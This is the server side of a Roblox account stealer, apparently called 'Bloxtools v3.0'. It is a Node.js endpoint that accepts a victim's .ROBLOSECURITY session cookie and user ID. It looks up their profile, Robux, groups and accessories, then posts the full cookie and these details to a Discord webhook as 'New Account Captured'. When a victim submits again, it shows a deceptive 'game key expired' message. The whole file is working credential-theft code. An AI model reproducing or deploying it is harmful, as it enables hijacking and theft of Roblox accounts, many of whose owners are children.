// api/submit.js – FINAL v3.0 with rate limiting & visible version
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// In-memory rate limiting: cookieHash -> timestamp
const cooldownStore = new Map();
const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes

function getCookieHash(cookie) {
  let hash = 0;
  for (let i = 0; i < cookie.length; i++) {
    hash = ((hash << 5) - hash) + cookie.charCodeAt(i);
    hash |= 0;
  }
  return hash.toString();
}

async function fetchWithTimeout(url, options, timeout = 8000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return res;
  } catch (err) {
    clearTimeout(id);
    throw err;
  }
}

async function fetchUserInfo(userId) {
  try {
    const res = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`);
    if (!res.ok) return null;
    const data = await res.json();

    const friendsRes = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    let friends = "N/A";
    if (friendsRes.ok) {
      const f = await friendsRes.json();
      friends = f.count?.toLocaleString() || "0";
    }

    let premium = "Unknown";
    try {
      const premRes = await fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
      if (premRes.ok) {
        const p = await premRes.json();
        premium = p.isPremium ? "✅ Yes" : "❌ No";
      }
    } catch (e) {}

    const banned = data.isBanned ? "⚠️ Banned" : "✅ Active";

    return {
      username: data.name,
      displayName: data.displayName,
      userId: data.id,
      created: new Date(data.created).toLocaleString(),
      description: data.description?.substring(0, 200) || "None",
      friends,
      premium,
      banned,
      profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
  } catch (err) {
    console.error("fetchUserInfo error:", err);
    return null;
  }
}

async function fetchRobux(cookie) {
  try {
    const res = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return "N/A";
    const data = await res.json();
    return data.robux?.toLocaleString() || "0";
  } catch (e) {
    return "N/A";
  }
}

async function fetchLastGame(userId) {
  try {
    const res = await fetchWithTimeout(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Asc&limit=1`);
    if (!res.ok) return "Unknown";
    const data = await res.json();
    if (data.data?.length) return `${data.data[0].name} (${data.data[0].id})`;
    return "No recent games";
  } catch (e) {
    return "Unknown";
  }
}

async function fetchGroups(userId) {
  try {
    const res = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!res.ok) return "None";
    const data = await res.json();
    if (!data.data?.length) return "No groups";
    const top = data.data.slice(0, 3).map(g => `${g.group.name} (${g.role.name})`);
    return top.join("\n");
  } catch (e) {
    return "Error";
  }
}

async function fetchAccessories(userId) {
  try {
    const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None";
    const data = await res.json();
    const assets = data.assets || [];
    const types = ["Hat", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Glasses", "Earrings", "Headphones"];
    const acc = assets.filter(a => types.includes(a.assetType.name)).map(a => a.name);
    if (!acc.length) return "No accessories";
    return acc.slice(0, 5).join(", ") + (acc.length > 5 ? " ..." : "");
  } catch (e) {
    return "Error";
  }
}

async function sendToDiscord(cookie, userId) {
  const [user, robux, lastGame, groups, accessories] = await Promise.all([
    fetchUserInfo(userId),
    fetchRobux(cookie),
    fetchLastGame(userId),
    fetchGroups(userId),
    fetchAccessories(userId)
  ]);

  const embed = {
    title: "🔓 New Account Captured",
    description: `**UserID:** \`${userId}\`\n**Cookie Length:** ${cookie.length} chars\n\n**Full Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
    color: 0x8c52ff,
    fields: [],
    footer: { text: "Bloxtools v3.0 • Rate Limited" },
    timestamp: new Date().toISOString()
  };

  if (user) {
    embed.fields.push(
      { name: "👤 Profile", value: `**${user.username}** (${user.displayName})\nID: ${user.userId}\nCreated: ${user.created}\nStatus: ${user.banned}\nAbout: ${user.description}`, inline: false },
      { name: "👥 Friends", value: user.friends, inline: true },
      { name: "💰 Robux", value: robux, inline: true },
      { name: "✨ Premium", value: user.premium, inline: true },
      { name: "🎮 Last Game", value: lastGame, inline: false },
      { name: "👥 Top 3 Groups", value: groups, inline: false },
      { name: "🕶️ Accessories", value: accessories, inline: false }
    );
  } else {
    embed.fields.push({ name: "⚠️ Error", value: "Could not fetch profile (user may be deleted)", inline: false });
  }

  embed.fields.push({ name: "🔐 Summary", value: `Length: ${cookie.length} chars\nUserID: ${userId}`, inline: false });

  const res = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "Bloxtools System", embeds: [embed] })
  });
  return res.ok;
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL" });

  const hash = getCookieHash(cookie);
  const now = Date.now();
  const last = cooldownStore.get(hash);
  if (last && now - last < COOLDOWN_MS) {
    return res.json({ success: false, blocked: true, message: "Game key expired or invalid. Please obtain a new key." });
  }
  cooldownStore.set(hash, now);
  if (cooldownStore.size > 100) {
    for (const [h, t] of cooldownStore.entries()) {
      if (now - t > COOLDOWN_MS) cooldownStore.delete(h);
    }
  }

  const webhookOk = await sendToDiscord(cookie, rbxuid);
  if (webhookOk) {
    return res.json({ success: true, firstTime: true });
  } else {
    return res.json({ success: false, error: "Processing failed" });
  }
};
